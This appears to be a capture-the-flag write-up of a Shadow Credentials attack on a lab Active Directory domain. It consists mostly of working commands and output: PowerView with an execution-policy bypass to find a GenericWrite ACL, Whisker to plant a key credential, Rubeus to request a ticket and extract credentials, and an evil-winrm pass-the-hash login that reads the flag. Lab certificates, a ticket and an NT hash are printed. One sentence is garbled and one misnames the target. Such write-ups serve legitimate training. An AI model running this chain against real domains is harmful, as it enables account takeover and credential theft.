

```
cd C:\Users\hr\Desktop
powershell -ep bypass
. .\PowerView.ps1

```

```
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" }


ObjectDN                : CN=vansprinkles,CN=Users,DC=AOC,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1115
IdentityReferenceName   : hr
IdentityReferenceDomain : AOC.local
IdentityReferenceDN     : CN=hr,CN=Users,DC=AOC,DC=local
IdentityReferenceClass  : user

> ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
```

```
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdenifyReferenceName, ObjectDN, ActiveDirectoryRights

IdenifyReferenceName ObjectDN                                                    ActiveDirectoryRights
-------------------- --------                                                    ---------------------
hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite
                     
```

As you can see from the previous output, the user "hr" has the `GenericWrite` permission over the administrator object visible on the CN attribute. Later, we can compromise the account with that privilege by updating the `msDS-KeyCredentialLink` with a certificate. This vulnerability is known as the Shadow Credentials attack.

One helpful tool for abusing the vulnerable privilege is `Whisker`, a C# utility created by Elad Shamir. Using Whisker is straightforward: once we have a vulnerable user, we can run the add command from Whisker to simulate the enrollment of a malicious device, updating the `msDS-KeyCredentialLink` attribute.

```
 .\Whisker.exe add /target:vansprinkles
 
PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password Inlnns88NUiMcOWZ
[*] Searching for the target account
[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 2ecb324e-3915-49a8-b7a7-bbf22a5602b9
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"Inlnns88NUiMcOWZ" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
PS C:\Users\hr\Desktop>
 
```
The tool will conveniently provide the certificate necessary to authenticate the impersonation of the vulnerable user with a command ready to be launched using `Rubeus`.

The core idea behind the authentication in AD is using the Kerberos protocol, which provides tokens (`TGT`) for each user. A TGT can be seen as a session token that avoids the credentials prompt after the user authentication.

`Rubeus`, a C# toolset designed for direct Kerberos interaction and exploitation, was developed by SpecterOps. a `pass-the-hash` attack!


```
Rubeus.exe asktgt /user:vansprinkles /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0EgglpMIIJZTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAgIBYFBAWiadgICB9AEggTYxVFEBBrX2F/SGHsqc/OvhHdrMUCNcAvGhY8I+TqfQpcKdue4HSF7b8zBz1b/YxexCw3t/E/JnJx5RsQ5BBZ0CNuCb1daoyEOfjfAiA6ueozhuVbCm/RkPYAiXYxiUAF6Wk6pvKEQNXzM60DoaPDpnT4l+B42KFyLMZakrlSfa5sWP3TFfiYHJdQKerS9N3Eg9MLDhQqvM4aiLuu52oqC7Widp2OJxhqCIORH9JBPIOkU0O2jVWam5JFOR5dH/dBX+Zi/4aeB0ZgArkRsdAdfhvr7tG5HaYS3vhIqZPjI3KustA4k+ve6a+dT65Wob/K4zg8r0vMbmiMfRPU+A0aDGjkaOj20QjP3hZZxjil6XYaxOatq3cI2j8UCxqbkSj1c36bacKTAleK3wZFQ7GvOeWGpY5hn9oJQ8UWN9S2AU3I+dE5mGdonrN81YdcI3g6jxqlJDhEV8jsvI8C3iQp3Oi3teMYLuGlEfa49/TIXCa5RitMVou3kOvB0d6U6fWhaHRYfhJei/beHZSAxxsWnAjFqsAj3QeeKRNApctLsl7ShHrZApJw+cOLp/w2YTdC5YfbsYWmek8dganm3xiQSDqMvW7huS+9lL4ripURNwohKgtYdiKk/DY4Fe+MxBMGpgRfpCXgPMBrNMvUXuNffu6Of6hZOMqsGjS5gu76D5CC0rh8KUN1IxINbBoZM3Do1J9cC3NYYkBjwsBRJZfYBCtinA0ZgjU1c2aZzdOi/RQlbt7t8bAQfr430wR3fRAJGw3ka3odAOYnzMtT+EdNjAANt+HHUsQ7RJk4Qx4QI+OgyVkfSgrycpxIT1D/Fm6xXreP5Gnr8EoktATOR2mIdoXCSg7mVsMlPwlywfe/nVPbpCBduU5jONMGOF61VdBR8CvOolRxMiDwUlP/G31EYBnUa7cQP8vsFNUUNiw7mTULG+awlMM/FXFffsGBlJA6L20FdKYTmmNTQ/Cm30wF2UUD1LuD6cj7pBzacLMXCSFLcJ3fcXXmcBF1t8wKiglxDrbTqgH3eOIToTXibnv0mscwytCjWnygazHJyAY/LbTx12QEk+36J8/DlN4TKzxfsgxGomexf+Gh77bJaU1NbsC8CD7pbPx+CNLy0AT15RyrFAwc2YqfpwLIR3ONhgZ5Z3LfEGoeAMKUkKlYdl4AN5VvpT6i5jH5gzjH1iBg8+SoPz47Dy8dmfez8Adn+ou7mZDZLfGZvMuA49NzXiOV6MLup/DrKUSVB+rNXbYXO7D+/+5J7d9ezz6BnNXxxwzXzLISJjzlhIs4s+agKnGiRuj+taGUY+OcO3kQmDOMUfMTWlIAsAN+PPYJaW1i0vPkUXUUNTykOEEDKnzU+0j61mUQLWxk/gkfIlgYjptuRec/JmRLQ0FCexSKC3yv8vU/vsoc3zCBYE1uBpluigNB5SmFTI6NHwxJo2aIRGdfap1/aggeWRqTCvnV56R9gLCu315dWDBiXkucihEM5WPwAwUlG4+OKv5O13fh35ngQYNj4zuFjCe/w6D5uI/bBVLjpkEQbHKCLUjBlYXSn1H+9/eP9xIa19bIEpy4TaRR5ILu1uABM7zgX9J6ySJlYV3aPH3nW/PTSg8yJXiK7mDfkUPbW5OrjnA41W4PAcbfcR2C/Y2mMrhjOZzGB6TATBgkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADQAOQA5ADgAYwAxAGMAMgAtAGMAOAAxAGUALQA0ADYANAA3AC0AOABjAGMANQAtAGUAMAAyADYAZABhADIANQA2ADAANQAwMHkGCSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDRwYJKoZIhvcNAQcGoIIDODCCAzQCAQAwggMtBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAjCXW4Jl09TXwICB9CAggMA9oLRSjAmwVYBAUm/7etywxLeRwzvVDMGnfd2YG8bTPg6Wzx2nTCmR2kymFZ6LvUPwdDnv+lvQE+HUHG3T2BIIYbqAFGSUiiSFFy821ms98bHnVGOkfRy0fcnw0UV3IJEWHSR7dMhzXMlYO4F5CH/vCuidD4Jf0+lNcOxLZz/POrX/PiARZDvvLgSlInkxbzonPZYM1DIciNg0cPP0QlI6J0ru7xYuc5Ir+GknXRwvYP2oaPfUjdB/Vlf2FYd5fttKG4Y5CXpdIWKgHbSciqmTzCWAy21m/MJaVDXe1wwGAC7zMIUrFZeOa3a569GhDTxLONehl2Php12V2+zyflcownsQnmOQxWAFow+MkPiRUiYHi27dVz1KGFWdnqwWNwvhjXbnaa1OC8oO9x0FSfzb5AHKbE9CHYcFpDtTwC8ahWh0m0EqTf16nWDFyHAKGwd6+iA4huAEkatTXjRSMHLXlBUClZGm56LjBCHA1P/BeZnUWBrTNPkKiCFq8ZPbkqtc3XXbeZP64ibzce4VGqHghPWeCFuJWO5bEMxGQEDJnxKQkGfmnpL6+fX6QPvNwKq9Xk65l+xhJ5UbufBaxwsYuJMx1CfN+dsZgrsuFoCIzSwRwSsFwaunYdy4E4uX9aAYZcT+krTNKM0e4BRPMcQ9bgajwriULU7AzqsxIZQfbKodQBocjzY5I3gvU184lUKnEtkfXtVFXiRBr27y4xX3WCs2cEByS4jQxtsoXjtf5qZEz/IGroqceD22eWaVu2DP0e8n76JnfZ/Jpeo+4x445wnbdJ9O47W+7rH+O2M//SPacjn77ezKpYpKx7vUGDPUypYMXJFNX7M1oynd2AmGdd+qC4yW+UoOqL9AOEMp8wvyX88DGraixPFiGz48FSY2kkhhWqvQofbV9bmocrozMrmYs7qv+2ysJBcB4ddPWbjP/rkH5o2qzQ1dy/Z1xUplfagIwwD/2l10TqWyc2eUprTOpVXki/yWa5PonapxtQvpmpuQyt/vk0+79HQhvONMDswHzAHBgUrDgMCGgQUR9HcRZslC1oroHnEf6c+Aa6ciekEFAjWmhFtwpXZneIMpx929dsQ6bFxAgIH0A== /password:"Tx1YqpW0o5ZN0bLb" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

```
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
[*] Using domain controller: fe80::3424:4f4:efec:cca%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF4DCCBdygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoQsbCUFPQy5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJQU9DLmxvY2Fso4IEuDCCBLSgAwIBEqEDAgECooIEpgSCBKJ4VHuh5rmwQ6mO
      lN8oqeATrPudM2c7VCqfJeVFfWX7d7kEdEJCesPFr33bDMl6OUpiok9BSyHlMVStNN3kw1iLq8aIdpHg
      4WI/Cb5c3pCkCmMTOWqKFJjz8ub/JNFYr+T0vIbNm6gbE7Sd6oWmv626mjmqLw9P8eAI2bXyNHWaYAH+
      GE2irXOu/UDPwKpjPd9lnG5jNu3XBmmp6pPJp/TRHDJKV6TNu7sw6QBnEAshm7FuWksL8qFlTeoftHaB
      vXGMRCRXrGVIYRqdjvGlpvVfvR6KK3Z5CVJ6gTYpdk28soPciVEaeS5YWeQ64iD/EvoOR375tz43IUFL
      hHVVy4kV1nYnbtvrv0WvbMJ5aaFERMBQpg7U7UOuIEZ+oh810ntYBchDyP7cYQrtUpnXPFoxVcRMjf47
      DQnU5m6JWtvLFuQjuXzUFs9YOulH/oJe+MZ/NTQXnnKMQHJfufxnCcb0P6TU4MtdgcjiJkm6bEikAihf
      LYZizUShAzC2o9a7vXen73ZcjP80T/3D4rkm5ZOIN2Zb4XEgkdxRf27ZjMcB2LMgwhlh4jm8B60kBgpg
      mjhxgtemAcJTCm+iIr2AuGwq0wKZSQVTHVD3TK4KQnUBzGnyAYuMJklh1/xq1QOdPA2oxLeLmsimhRTo
      Zn9RJ4pov6AYqWzj97OgLaY+J6D50uEKEoKGddobTEc4NiyBe6fbcYq0e9+H2wL5OydKdg35zcAROmBI
      8yHRVQpYdreu6zZaY9WlhhdHnhRpcCOk6Ip58GoLh0ty/iX4KiKgOvQ88qjn0IeYAMEvNIwnfN1oE6gt
      /XdvOIoWl6tGsKm64VY1Uo+iuhz0Q8KBBwoEYSZ5fYKo4ERjdlqJBK1vaLflFTG0RntndnFr33M/s1a8
      qcS6CEDto60QmbfmlnMJqX1c12FGEjuIdcBolB+BeWOevOhrHR8D65hZXXo+/gYVn27Tgf4O5r3EqmAv
      L9tvSzntF7wFVciGM1OHKWyb5ZVLOTJZXxCakvlD9MoFkxXFTD58qi8X/D6FdL39THnCGDIM23mq0w4n
      WyxlSnb8INSb5TdhfdSFmoTtxp+h92D9JNrYup6QEX3tfDnEYpH80dk+Q5Zt1UtXsfFRwvUnpeWwmD30
      jmIKlal8aRTMH/GBNAyxMI7hMRspd2t1zR8IbxWdE/x814lokQ7NwvhlEZTXkTJQKKaEspCxnbZRTdbA
      7PA7+4PGrV+uSQSqb+prTIn4HcVelX4fi0BQbMcjDbp8QguJaCNhyD0cTrOkfijHSk4wEmjZKjDfMOs/
      Vu6bM6CNPpIqj5IRUFh0y/lJs72yN7mBIK5EYdK8IwFNFdiO6g7R/62GmNAOLEnleFaQDb44GZDafQGM
      Iy3DpfV7HjuyoWwUHGSMJl2NCx3P1SApdjlSy+GXPt2Oz7t2S5Sf+/g8nREeycUeY00dm6/ghjEAvpQA
      X2tszLUWG7gSXrkI/RfclrOO0ODWVnS+2SZL3Ta+kyPfAbfgESD1Tr7gFWhwrGnIMmvLMvPNJIXpZeE+
      M+m9lA3AlOog6uH3w5PyV6eJ5YvX5Mn7mbb4Rt8qvavDvxPIo4HRMIHOoAMCAQCigcYEgcN9gcAwgb2g
      gbowgbcwgbSgGzAZoAMCARehEgQQJ1YjzjhV5eNwRY082oDtWqELGwlBT0MuTE9DQUyiGTAXoAMCAQGh
      EDAOGwx2YW5zcHJpbmtsZXOjBwMFAEDhAAClERgPMjAyMzEyMTExOTExMTRaphEYDzIwMjMxMjEyMDUx
      MTE0WqcRGA8yMDIzMTIxODE5MTExNFqoCxsJQU9DLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlB
      T0MubG9jYWw=

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  vansprinkles
  UserRealm                :  AOC.LOCAL
  StartTime                :  12/11/2023 7:11:14 PM
  EndTime                  :  12/12/2023 5:11:14 AM
  RenewTill                :  12/18/2023 7:11:14 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  J1YjzjhV5eNwRY082oDtWg==
  ASREP (key)              :  0F8D4F9026D7798D387EABAFDA55532E

[*] Getting credentials using U2U

```

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.55.52 -u vansprinkles -H  03E805D8A8C5AA435FB48832DAD620E3

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\vansprinkles\Documents> 
*Evil-WinRM* PS C:\Users\vansprinkles\Documents> cd ..
*Evil-WinRM* PS C:\Users\vansprinkles> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/13/2023   6:50 PM                Administrator
d-----       10/13/2023  12:04 PM                ecogremlin
d-----       11/14/2023   7:09 AM                hr
d-r---       11/22/2023  10:57 AM                Public
d-----       10/13/2023  12:52 PM                santa
d-----       10/24/2023   1:13 PM                TEMP
d-----       10/13/2023   1:01 PM                user
d-----       11/15/2023   9:29 PM                vansprinkles


cd *Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/22/2023  10:56 AM                chatlog_files
-a----       11/22/2023  10:29 AM          11620 chatlog.html
-a----       10/16/2023   7:33 AM             17 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
THM{XMAS_IS_SAFE}

```